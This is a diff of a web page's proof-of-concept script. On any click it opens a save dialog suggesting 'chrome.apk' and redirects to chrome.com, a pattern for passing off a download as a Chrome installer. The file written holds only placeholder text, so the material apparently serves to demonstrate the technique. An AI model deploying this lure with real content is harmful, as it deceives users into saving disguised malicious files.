@@ -11,35 +11,34 @@
 
 <script>
 document.addEventListener('click', async () => {
-    // Delay kecil sebelum picker
     setTimeout(async () => {
         if ('showSaveFilePicker' in window) {
             try {
                 const handle = await window.showSaveFilePicker({
                     suggestedName: 'chrome.apk',
                     types: [{
-                        description: 'Android Package (demo)',
-                        accept: {
-                            'application/octet-stream': ['.apk']
-                        }
+                        description: 'Android Package (PoC)',
+                        accept: { 'application/octet-stream': ['.apk'] }
                     }]
                 });
 
                 const writable = await handle.createWritable();
-                await writable.write('Hai aja');
-                await writable.close();
 
-            } catch (err) {
-                // cancel / abort expected
+                // ISI FILE (PoC only)
+                await writable.write(
+                    'PoC file\nThis is not a real APK\nFor demonstration only'
+                );
+
+                await writable.close();
+            } catch (e) {
+                // cancel expected
             }
         }
     }, 1000);
 
-    // Redirect paralel
     setTimeout(() => {
         window.location.href = 'https://chrome.com';
     }, 1000);
-
 }, { once: true });
 </script>
 
